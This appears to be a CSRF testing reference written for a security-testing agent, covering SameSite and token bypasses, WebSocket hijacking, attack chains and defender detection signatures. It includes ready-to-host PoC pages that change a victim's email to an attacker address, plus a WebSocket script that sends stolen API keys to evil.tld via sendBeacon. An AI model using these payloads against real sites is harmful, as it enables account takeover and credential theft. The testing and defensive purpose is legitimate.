---
name: csrf
description: CSRF — token/double-submit bypass, SameSite (Chrome Lax+POST window; same-site sibling pivots), Fetch Metadata, CORS misconfig, CSWSH (WebSocket hijacking), state-change abuse; PoC templates included
---

# CSRF

Cross-site request forgery abuses ambient authority (cookies, HTTP auth) across origins. Do not rely on CORS alone; enforce non-replayable tokens and strict origin checks for every state change.

The advanced+expert depth (sub-resource CSRF, cross-origin auth-flow abuse, CORS-relaxed exploits, JSON-CSRF depth, WebTransport / SSE CSRF, CSWSH hardened-target bypasses, PoC-template variants for edge cases) lives in `csrf_advanced_deep.md`. The 2024–2026 CVE frontier — Spring STOMP CSRF, ASP.NET Core AntiForgery bypass via smuggling (twofer with `http_request_smuggling_novel_deep.md`), OAuth CSRF RFC 9700 shift, Rails `protect_from_forgery` OTP-XOR class, SSE-CSRF class — lives in `csrf_novel_deep.md`. This file is the standard-mode entry point: a hunter loading only this file is effective for the base class.

## Attack Surface

**Session Types**
- Web apps with cookie-based sessions and HTTP auth
- JSON/REST, GraphQL (GET/persisted queries), file upload endpoints

**Authentication Flows**
- Login/logout, password/email change, MFA toggles

**OAuth/OIDC**
- Authorize, token, logout, disconnect/connect endpoints

## High-Value Targets

- Credentials and profile changes (email/password/phone)
- Payment and money movement, subscription/plan changes
- API key/secret generation, PAT rotation, SSH keys
- 2FA/TOTP enable/disable; backup codes; device trust
- OAuth connect/disconnect; logout; account deletion
- Admin/staff actions and impersonation flows
- File uploads/deletes; access control changes

## Reconnaissance

### Session and Cookies

- Inspect cookies: HttpOnly, Secure, SameSite (Strict/Lax/None)
- Lax allows cookies on top-level cross-site GET; None requires Secure
- Determine if Authorization headers or bearer tokens are used (generally not CSRF-prone) versus cookies (CSRF-prone)

### Token and Header Checks

- Locate anti-CSRF tokens (hidden inputs, meta tags, custom headers)
- Test removal, reuse across requests, reuse across sessions, binding to method/path
- Verify server checks Origin and/or Referer on state changes
- Test null/missing and cross-origin values

### Method and Content-Types

- Confirm whether GET, HEAD, or OPTIONS perform state changes
- Try simple content-types to avoid preflight: `application/x-www-form-urlencoded`, `multipart/form-data`, `text/plain`
- Probe parsers that auto-coerce `text/plain` or form-encoded bodies into JSON

### CORS Profile

- Identify `Access-Control-Allow-Origin` and `-Credentials`
- Overly permissive CORS is not a CSRF fix and can turn CSRF into data exfiltration
- Test per-endpoint CORS differences; preflight vs simple request behavior can diverge

## Key Vulnerabilities

### Navigation CSRF

- Auto-submitting form to target origin; works when cookies are sent and no token/origin checks are enforced
- Top-level GET navigation can trigger state if server misuses GET or links actions to GET callbacks

### Simple Content-Type CSRF

- `application/x-www-form-urlencoded` and `multipart/form-data` POSTs do not require preflight
- `text/plain` form bodies can slip through validators and be parsed server-side

### JSON CSRF

- If server parses JSON from `text/plain` or form-encoded bodies, craft parameters to reconstruct JSON
- Some frameworks accept JSON keys via form fields (e.g., `data[foo]=bar`) or treat duplicate keys leniently

### Login/Logout CSRF

- Force logout to clear CSRF tokens, then chain login CSRF to bind victim to attacker's account
- Login CSRF: submit attacker credentials to victim's browser; later actions occur under attacker's account

### OAuth/OIDC Flows

- Abuse authorize/logout endpoints reachable via GET or form POST without origin checks
- Exploit relaxed SameSite on top-level navigations
- Open redirects or loose redirect_uri validation can chain with CSRF to force unintended authorizations

### File and Action Endpoints

- File upload/delete often lack token checks; forge multipart requests to modify storage
- Admin actions exposed as simple POST links are frequently CSRFable

### GraphQL CSRF

- If queries/mutations are allowed via GET or persisted queries, exploit top-level navigation with encoded payloads
- Batched operations may hide mutations within a nominally safe request

### WebSocket CSRF (CSWSH)

Cross-Site WebSocket Hijacking: the WebSocket handshake is a plain HTTP
request that carries cookies and is **not subject to SameSite=Lax's
POST/method restriction and not covered by CORS** — the browser will open a
cross-site socket unless the server validates the `Origin` header at the
handshake. If it doesn't, an attacker page opens an authenticated socket in
the victim's context and both sends actions *and reads the responses*
(unlike form CSRF, which is blind).

- Signal: the handshake (`GET ... Upgrade: websocket`) succeeds with the
  victim's cookie and no `Origin` allowlist check; the app authenticates the
  socket purely from the cookie.
- Impact is read+write: exfiltrate messages (chat, notifications, tokens
  pushed over the socket) and issue privileged `send()` actions.

```html
<script>
// hosted on attacker origin; victim's cookies ride the handshake
const ws = new WebSocket("wss://target.example/socket");
ws.onopen = () => ws.send(JSON.stringify({action:"listApiKeys"}));
ws.onmessage = e => navigator.sendBeacon("https://evil.tld/x", e.data); // read back
</script>
```

- Note SameSite still applies to the handshake cookie: an explicit
  `SameSite=Strict/Lax` session cookie is *not* sent cross-site on the
  handshake, closing CSWSH. It bites when the cookie is `SameSite=None` (or
  default-Lax within the 2-minute window) and Origin is unchecked.

## Bypass Techniques

### SameSite Nuance

- Lax-by-default cookies are sent on top-level cross-site GET but not POST
- Exploit GET state changes and GET-based confirmation steps
- Legacy or nonstandard clients may ignore SameSite; validate across browsers/devices

**The Lax+POST 2-minute window.** Chrome's "Lax-allowing-unsafe"
intervention sends a cookie on a *top-level cross-site POST* if the cookie
has **no explicit `SameSite` attribute** (so it defaulted to Lax) **and is
at most 2 minutes old**. This is the highest-value SameSite CSRF gap: if the
target sets/refreshes its session cookie without `SameSite` on a common
action (login, SSO landing, cart), you have a ~120-second window to fire a
top-level POST CSRF. Chain it: force a fresh cookie (a login CSRF or an
attacker-triggered SSO redirect that re-issues the session), then within two
minutes auto-submit the state-changing POST.

```html
<!-- step 1: navigate the victim through a flow that re-issues the session cookie -->
<!-- step 2: within 2 minutes, top-level POST fires and carries the fresh default-Lax cookie -->
<form id=f action="https://target/account/email" method="POST">
  <input name="email" value="attacker@evil.tld">
</form><script>f.submit()</script>
```

Distinguish it from an **explicit** `SameSite=Lax` cookie, which the window
does **not** apply to. Confirm from the `Set-Cookie` header whether SameSite
is set or merely defaulted.

**SameSite is same-*site*, not same-*origin*.** A cookie scoped to
`.example.com` is sent by any `*.example.com` subdomain, and a request from
`sub.example.com` to `example.com` is same-site — so an XSS, an open redirect,
or a subdomain takeover on any sibling subdomain defeats SameSite entirely.
The public-suffix boundary is what matters, not the exact host. Load
`subdomain_takeover` when a dangling sibling is the pivot.

**Convert POST to GET.** If the app also accepts the state change over GET
(or honors a method override), SameSite=Lax stops protecting it, because
top-level cross-site GET carries Lax cookies. Always retest the action as a
GET.

### Origin/Referer Obfuscation

- Sandbox/iframes can produce null Origin; some frameworks incorrectly accept null
- `about:blank`/`data:` URLs alter Referer
- Ensure server requires explicit Origin/Referer match

### Method Override

- Backends honoring `_method` or `X-HTTP-Method-Override` may allow destructive actions through a simple POST

### Token Weaknesses

- Accepting missing/empty tokens
- Tokens not tied to session, user, or path
- Tokens reused indefinitely; tokens in GET
- Double-submit cookie without Secure/HttpOnly, or with predictable token sources

### Content-Type Switching

- Switch between form, multipart, and `text/plain` to reach different code paths
- Use duplicate keys and array shapes to confuse parsers

### Header Manipulation

- Strip Referer via meta refresh or navigate from `about:blank`
- Test null Origin acceptance
- Leverage misconfigured CORS to add custom headers that servers mistakenly treat as CSRF tokens

### Fetch Metadata Defenses

Modern apps increasingly defend with Fetch Metadata (`Sec-Fetch-*`) instead
of (or alongside) tokens. The browser sets these and a page cannot forge
them, so the bypass is about the request shapes that *legitimately* carry a
permissive value:

- The server typically blocks state changes where `Sec-Fetch-Site: cross-site`
  and allows `same-origin`/`none`. A cross-site form POST or fetch is
  `cross-site` → blocked. Look for endpoints that only check `Sec-Fetch-Mode`
  or ignore `Sec-Fetch-Site`, or that allowlist `Sec-Fetch-Site: same-site`
  (which a sibling subdomain satisfies — see SameSite is same-site).
- `Sec-Fetch-Site: none` is set on user-initiated navigations (typed URL,
  bookmark); a top-level GET navigation to a state-changing GET endpoint can
  arrive as `none`, not `cross-site`.
- Old browsers and non-browser clients omit `Sec-Fetch-*` entirely; a server
  that *fails open* on missing headers is bypassable from any non-browser
  request (curl, server-to-server) — though that is not a browser CSRF.
- The defense is only as good as its coverage: test every state-changing
  route, since teams often apply the check via middleware that misses some
  handlers.

### Double-Submit and Token-Binding Bypass

The double-submit-cookie pattern (token in a cookie + mirrored in a
header/body, compared for equality) fails when the attacker can *set* the
cookie, because they then control both halves:

- **Cookie injection from a sibling** — a subdomain you control (XSS, or a
  taken-over `sub.example.com`) can `Set-Cookie` a `Domain=.example.com`
  CSRF cookie; you then send the matching token in the body. Cookie
  precedence lets the injected value win. Load `header_injection` for the
  `Set-Cookie` injection path and `subdomain_takeover` for the sibling.
- **Attacker-chosen token** — if the CSRF cookie is set by the app to any
  value the attacker can predict or seed (reflected, or issued to an
  unauthenticated attacker session and not rotated on login), the double
  submit is satisfiable.
- **Token not bound to the session/user** — a valid token minted for the
  attacker's own account is accepted in the victim's request. Test cross-
  account and cross-session token reuse explicitly.
- **Stateless HMAC token without a per-session secret** — if the token is a
  static/global HMAC not tied to the session, one captured token works for
  everyone.

## Special Contexts

### Mobile/SPA

- Deep links and embedded WebViews may auto-send cookies; trigger actions via crafted intents/links
- SPAs that rely solely on bearer tokens are less CSRF-prone, but hybrid apps mixing cookies and APIs can still be vulnerable

### Integrations

- Webhooks and back-office tools sometimes expose state-changing GETs intended for staff
- Confirm CSRF defenses there too

## Chaining

CSRF is a delivery primitive — it transfers a capability granted by ambient authority to a downstream action. Model as capability transfer, routed by filename.

**Upstream — what grants CSRF:**
- **Session cookie without SameSite=Strict** — the ambient-authority substrate. Lax (default) opens top-level GET + the 2-minute Lax+POST window; None opens everything cross-site.
- **Sibling subdomain foothold** — XSS or subdomain takeover on `sub.example.com` lets same-site cookie policies fire against `example.com` (SameSite is same-*site*, not same-*origin*). Route to `subdomain_takeover.md` for the takeover primitive.
- **Login CSRF chain input** — force the victim to authenticate as the attacker; subsequent actions land in the attacker's account (chain input for account-linking abuse).
- **OAuth flow initiation** — CSRF against `/authorize` or callback URLs is the OAuth-CSRF class (RFC 9700 upgrades the state-parameter requirement from SHOULD to MUST).

**Downstream — what CSRF grants:**
- **State change under victim's identity** — the canonical impact; grants password/email change, MFA disable, funds transfer, account deletion. Terminal for many findings.
- **IDOR reach** — CSRF + IDOR: force actions on other users' resources once references are known. Route to `idor.md` for the reference-enumeration primitive.
- **Cross-origin exfiltration via CSWSH** — read+write over an authenticated WebSocket; different from form-CSRF which is blind. See the CSWSH section above.
- **OAuth account linking** — bind the victim's provider account to the attacker's app account (or vice versa), yielding persistent takeover.
- **SPA state pollution** — modern React/Vue/Angular SPAs using cookie sessions still expose CSRF surface; pollution of stored client state, sometimes chained with client-side rendering.
- **HTTP smuggling → CSRF bypass** — a smuggled request can hit an endpoint that the anti-CSRF layer thinks was verified upstream, effectively bypassing the CSRF check. Route to `http_request_smuggling.md`; the CSRF-specific expression is at `csrf_novel_deep.md § ASP.NET Core AntiForgery Bypass — CVE-2025-55315`.

**Composite chains — end-to-end paths, each hop routed:**
1. **Login CSRF → attacker-account binding → OAuth linking → persistent takeover** — victim submits attacker-supplied login credentials, then OAuth-links their real identity provider to the attacker's account; attacker now has persistent access under victim's provider identity. Chain: CSRF (this file) → OAuth linking → persistent takeover.
2. **CSWSH → read tokens → API takeover** — victim visits attacker page; attacker opens authenticated WebSocket, requests tokens/API keys pushed over the socket, exfiltrates. Chain: CSRF/CSWSH (this file) → token disclosure → API access as the victim's role.
3. **Sibling subdomain XSS → cookie injection → double-submit satisfy → CSRF** — subdomain XSS sets a `Domain=.example.com` cookie carrying an attacker-chosen anti-CSRF token; the CSRF request then includes the matching body token; the double-submit check passes because both values are attacker-controlled. Chain: XSS (`xss.md`) → cookie injection → CSRF (this file).
4. **HTTP smuggling → antiforgery bypass → CSRF** — front-end antiforgery check bypassed by smuggling a request that appears authenticated; the smuggled request performs the state change. Chain: smuggling (`http_request_smuggling.md`) → antiforgery bypass → state change (this file).

Chaining is reachability/enablement — a granted capability, not a severity multiplier.

## Frontier CVE Routes

Base names + one-line class shape; the version tables and mechanism decomposition live in the novel sibling (§2 CVE single-ownership).

- **Spring Framework STOMP CSRF — CVE-2025-41254** — WebSocket-CSRF class expression: Spring's STOMP-over-WebSocket messaging didn't apply CSRF protection to STOMP frames sent over an authenticated session, allowing cross-origin STOMP-message injection. Full version table + mechanism dissection in `csrf_novel_deep.md § Spring Framework STOMP CSRF — CVE-2025-41254`.
- **ASP.NET Core AntiForgery bypass via HTTP smuggling — CVE-2025-55315** — CVSS 9.9 (highest ASP.NET Core severity in the class): HTTP request smuggling allows bypassing the ASP.NET Core AntiForgery middleware. **Batch-7 twofer** — the primary owner is `http_request_smuggling_novel_deep.md § ASP.NET Core Smuggling — CVE-2025-55315`; the CSRF-specific impact framing lives at `csrf_novel_deep.md § ASP.NET Core AntiForgery Bypass — CVE-2025-55315`.
- **OAuth CSRF cluster — RFC 9700 (Jan 2025) upgraded state/PKCE from SHOULD to MUST** — several 2024–2026 CVEs exemplify the class: `CVE-2025-68481` (fastapi-users OAuth state token without random claim), `CVE-2025-66629` (HedgeDoc missing OAuth2 `state` parameter). Full cluster + RFC-9700 impact framing in `csrf_novel_deep.md § OAuth CSRF — RFC 9700 State/PKCE Shift`.
- **SSE (EventSource) CSRF class — Algernon CVE-2026-46431** — SSE uses CORS "simple request" semantics (no custom headers, no preflight); auto-reconnect replays credentials; an SSE endpoint with `ACAO: *` returning user-specific data is a live cross-origin read primitive. Anchor CVE + technique-class framing in `csrf_novel_deep.md § SSE (EventSource) CSRF Class`.
- **Rails `protect_from_forgery` OTP-XOR technique class** — no CVE (framework-wide technique disclosure); the OTP bundled with the CSRF token ciphertext lets attackers Base64-decode the token, extract the OTP, XOR to recover the raw token, and re-encrypt with attacker OTP. Technique-class framing in `csrf_novel_deep.md § Rails protect_from_forgery OTP-XOR Class`.

## Testing Methodology

1. **Inventory endpoints** - All state-changing endpoints including admin/staff
2. **Note request details** - Method, content-type, whether reachable via simple requests
3. **Assess session model** - Cookies with SameSite attrs, custom headers, tokens
4. **Check defenses** - Anti-CSRF tokens and Origin/Referer enforcement
5. **Attempt preflightless delivery** - Form POST, text/plain, multipart/form-data
6. **Test navigation** - Top-level GET navigation
7. **Cross-browser validation** - Behavior differs by SameSite and navigation context

## Sink Fingerprinting

Before firing a CSRF PoC, classify the target endpoint — the shape decides which delivery vector works and which confirmation oracle applies.

**State-change endpoints classified by parser:**
- **Form-encoded endpoint** (`application/x-www-form-urlencoded`) — auto-submit form works directly; no preflight. Highest-value CSRF surface.
- **Multipart endpoint** (`multipart/form-data`) — auto-submit form with `enctype="multipart/form-data"`; no preflight. File-upload / delete endpoints commonly fall here.
- **JSON endpoint that accepts `text/plain`** — server-side parser accepts non-preflighted body; craft padded JSON with a form. Common in older Node/Express apps.
- **JSON endpoint that requires `application/json`** — the `application/json` Content-Type triggers CORS preflight; simple CSRF fails without a CORS misconfig. Confirmed non-vulnerable to naive CSRF unless CORS allows credentials from arbitrary origins.
- **GraphQL endpoint** — GET-based queries or persisted queries may bypass POST-only defenses; POST-based requires JSON parser fingerprint above.
- **WebSocket handshake** — plain HTTP GET with `Upgrade: websocket` carries cookies without SameSite=Lax's POST restriction — CSWSH class if Origin isn't checked.

**Session-cookie shape decides delivery vector:**
- `SameSite=Strict` — cookie NOT sent cross-site at all; CSRF blocked at cookie layer (still test sibling subdomain XSS chains).
- `SameSite=Lax` explicit — cookie sent on top-level cross-site GET only; the 2-minute Lax+POST window does NOT apply (that's for defaulted-Lax only).
- `SameSite=Lax` defaulted (no explicit attribute + Chrome ≥ Feb-2020 default) — Lax+POST 2-minute window applies to fresh cookies.
- `SameSite=None; Secure` — cookie sent on all cross-site requests; full CSRF surface.
- `HttpOnly` — irrelevant to CSRF (doesn't affect cross-site sending, only JS read).
- Session in `Authorization: Bearer <token>` — not a cookie, no ambient authority, no CSRF surface (unless the app also accepts a session cookie fallback).

The `Set-Cookie` header on a login response is the primary fingerprint — capture it, parse the `SameSite` attribute (or its absence), record.

## Confirmation Discipline

CSRF's confirmation surface is straightforward but has failure modes worth naming.

- **Actual state change with paired before/after evidence** is the strongest signal. `GET /account/settings` before + `GET /account/settings` after the CSRF PoC shows the field change (email, MFA state, etc.).
- **Response-status alone is not confirmation** — a 200 on the CSRF POST may indicate the endpoint accepted the request without applying the state change (silent failure, or CSRF protection returning 200 with an error page). Verify the state via a follow-up read.
- **PoC hosted on a genuinely-cross-origin domain** — a PoC hosted on `attacker.localhost` or a same-site subdomain of the target is not proof of cross-origin CSRF; the same-site policy passes. Use an unrelated domain (`attacker.tld`, a public sandbox, an nip.io host with a distinct IP).
- **Cookie-context match** — the PoC must run in the victim's browser with the target's session cookie present. Reproducing in an incognito tab (no session) yields a different response (usually 401/302), which isn't CSRF evidence.
- **Browser-matrix consideration** — SameSite defaults differ historically across browsers; a Chrome-verified finding may not reproduce on Firefox, Safari, or older Edge. State the browser + version tested.
- **Login-CSRF confirmation** — the CSRF request logs the victim in as the attacker; verify by observing the attacker-account UI in the victim's session (username, avatar), not by the login-response status alone.

The finding is *the specific state change, cross-origin, without user interaction beyond page visit*. Anything short of that is a partial confirmation.

## Tooling

- **Burp Suite (community + pro) — CSRF PoC generator** — right-click a request → "Engagement tools" → "Generate CSRF PoC" produces an HTML form auto-submit page for form-encoded and multipart requests. Adjust content-type for JSON-via-text/plain variants.
- **OWASP ZAP CSRF scanner** — automated tokens/Origin checks; false positives common on endpoints that always return 200. Use as a first pass, verify manually.
- **`csurf-explorer`** — community tool for automated CSRF finding across a target's endpoints; parses forms and infers state-change endpoints.
- **Browser DevTools + Fetch tab** — for iterating on cross-origin fetch PoCs; the Network panel shows preflight vs simple request and the eventual response.
- **Playwright / Puppeteer / headless Chrome** — automated confirmation for CSWSH (needs a real browser) and Lax+POST-window timing (requires exact 120-second window). Also useful for cross-browser matrix verification.
- **`csrf-poc-generator` (npm)** — batch PoC generation from a Burp export.
- **`ffuf` for endpoint enumeration** — before CSRF-testing, sweep for state-change endpoints (`--filter-code 405` finds endpoints that reject method X but might accept POST/GET differently).
- **`gau` + `hakrawler`** — passive URL discovery from waybackmachine/CommonCrawl; useful for finding forgotten state-change endpoints.
- **`interactsh-client`** — OAST for confirming that a CSRF endpoint's server-side handler makes an outbound callback (e.g., webhook creation, notification dispatch).

## PoC Templates

Copy-pastable delivery pages — host on an attacker origin, land the victim,
and confirm the state change on their account. All avoid preflight.

Auto-submit form (url-encoded, the default vector):
```html
<form id=f action="https://target/account/email" method="POST">
  <input name="email" value="attacker@evil.tld">
</form><script>f.submit()</script>
```

JSON endpoint via `text/plain` (when the server parses JSON from a
non-preflighted body — pad to make valid JSON):
```html
<form id=f action="https://target/api/profile" method="POST"
      enctype="text/plain">
  <input name='{"email":"attacker@evil.tld","ignore":"' value='"}'>
</form><script>f.submit()</script>
<!-- body serializes to: {"email":"attacker@evil.tld","ignore":"="} -->
```

Multipart (file upload / delete, or JSON key smuggling):
```html
<form id=f action="https://target/upload" method="POST"
      enctype="multipart/form-data">
  <input type="file" name="file"> <!-- pre-seed via DataTransfer, or use fetch below -->
</form>
```

Fetch (simple request, credentialed — for text/plain or form bodies only,
since custom headers would trigger preflight):
```html
<script>
fetch("https://target/api/profile", {
  method: "POST", credentials: "include",
  headers: {"Content-Type": "text/plain"},
  body: '{"email":"attacker@evil.tld"}'
});
</script>
```

Top-level GET (for GET-honoring state changes / SameSite=Lax):
```html
<img src="https://target/account/delete?confirm=1">
```

## Validation

1. Demonstrate a cross-origin page that triggers a state change without user interaction beyond visiting
2. Show that removing the anti-CSRF control (token/header) is accepted, or that Origin/Referer are not verified
3. Prove behavior across at least two browsers or contexts (top-level nav vs XHR/fetch)
4. Provide before/after state evidence for the same account
5. If defenses exist, show the exact condition under which they are bypassed (content-type, method override, null Origin)

## False Positives

- Token verification present and required; Origin/Referer enforced consistently
- No cookies sent on cross-site requests (SameSite=Strict, no HTTP auth) and no state change via simple requests
- Only idempotent, non-sensitive operations affected

Common shapes that *look like* CSRF but are not:

- **Test-endpoint 200 with no state change** — the target returned 200 for the CSRF POST but the follow-up read shows no state change. The endpoint may require a token in a header the CSRF PoC didn't send; token was missing → server rejected silently but returned 200. Report as "endpoint accepts request, does not apply state change without proper CSRF token."
- **Reproduction only in test environment** — a target with SameSite=Lax in prod but None in staging is CSRF-testable in staging but not in prod. State the environment.
- **Reproduction only in the tester's browser session** — running the PoC in a browser where the tester is logged in as the target proves cookie forwarding, not cross-origin CSRF. Reproduce from a fresh browser with a separate victim session.
- **Same-origin "PoC" hosted on target's own domain** — the same-site policy passes; no CSRF is being tested. Use a genuinely-cross-origin host.
- **Old Firefox / Safari that ignore SameSite** — if a target relies on SameSite as its sole defense, an old browser bypasses it — but the CSRF finding requires the target's realistic user base to include old browsers. Note the browser matrix.
- **CORS Allow-Origin: * on a state-change endpoint** — this looks like a CORS misconfiguration but doesn't grant CSRF because credentials aren't sent unless `Access-Control-Allow-Credentials: true` is also set. Verify both headers.

## Response Behavior Fingerprinting

Before firing CSRF probes, fingerprint what the target's response behavior tells you about CSRF posture. A three-request scan reveals the CSRF middleware's presence, coverage, and strictness.

**Probe 1 — request state-change without any CSRF-defense header:**

```
POST /account/action HTTP/1.1
Host: target.example.com
Cookie: session=<attacker-session>

field=value
```

Response shape:
- 403 with CSRF-token-missing error → CSRF middleware present + token-based.
- 403 with generic auth error → different auth failure, not CSRF (attacker session may not have permissions).
- 200 with successful state change → CSRF middleware absent or not applied to this endpoint.
- 200 with error-page-shape response → likely CSRF middleware silently rejecting; verify state didn't change.

**Probe 2 — request with attacker-crafted Origin header:**

```
POST /account/action HTTP/1.1
Host: target.example.com
Origin: https://evil.attacker.tld
Cookie: session=<attacker-session>

field=value
```

Response shape:
- 403 with Origin-rejection error → Origin check enforced.
- Same response as Probe 1 → no Origin check.
- 400 with malformed-request-shape error → possibly rejecting the header itself.

**Probe 3 — request with no Origin header:**

```
POST /account/action HTTP/1.1
Host: target.example.com
Cookie: session=<attacker-session>

field=value
```

Response shape:
- 403 with missing-Origin error → strict Origin enforcement (fail-closed).
- Same as Probe 1 → no Origin check or fail-open on missing.

The three probes together reveal: (a) CSRF middleware presence, (b) Origin check presence + fail-open/closed posture, (c) whether the endpoint is genuinely protected.

## Detection Signatures for Defenders

Defender-side signal shapes that fire during CSRF attempts; useful for purple-team overlap.

- **Cross-origin `Origin` / `Referer` headers on state-change endpoints** — SIEM rule matching state-change routes where the `Origin` header doesn't match the app's own domain (allowing subdomain matches per your same-site scope).
- **Sudden spike in state-change requests from a single IP or a browser fingerprint** — CSRF at scale (e.g., admin panel state changes across many accounts) produces a burst signal.
- **State-change endpoints hit without a preceding auth request** — CSRF sessions typically don't include a fresh login; the session was pre-existing. Anomaly.
- **Anti-forgery-token validation failures** — every framework's CSRF middleware logs the failure. Django's `django.security.csrf`, ASP.NET Core's `Microsoft.AspNetCore.Antiforgery`, Rails' `ActionController::InvalidAuthenticityToken`. Spike detection on any of these is a CSRF-attempt signal.
- **Cross-origin WebSocket handshakes without Origin allowlist match** — CSWSH signature; server-side WebSocket-upgrade logs should record the `Origin` header per handshake and alert on unexpected origins.

**Compensating controls:**
- `SameSite=Strict` on session cookies where feasible (breaks legitimate cross-site links, so per-app trade-off).
- Fetch Metadata middleware (`Sec-Fetch-Site: cross-site` rejection) — as of 2024–2026 not shipped as framework default in any major framework; community middleware exists for Django, Spring, Express, Laravel — deploy explicitly.
- Anti-forgery-token double-submit with the token in a JS-set header (not a hidden form field) — requires attacker JS execution to forge, moves the exploit path to XSS.
- Origin allowlist enforcement on WebSocket handshakes.

## Impact

- Account state changes (email/password/MFA), session hijacking via login CSRF
- Financial operations, administrative actions
- Durable authorization changes (role/permission flips, key rotations) and data loss

## Pro Tips

1. Prefer preflightless vectors (form-encoded, multipart, text/plain) and top-level GET if available
2. Test login/logout, OAuth connect/disconnect, and account linking first
3. Validate Origin/Referer behavior explicitly; do not assume frameworks enforce them
4. Toggle SameSite and observe differences across navigation vs XHR
5. For GraphQL, attempt GET queries or persisted queries that carry mutations
6. Always try method overrides and parser differentials
7. Combine with clickjacking when visual confirmations block CSRF

## Summary

CSRF is eliminated only when state changes require a secret the attacker cannot supply and the server verifies the caller's origin. Tokens and Origin checks must hold across methods, content-types, and transports.
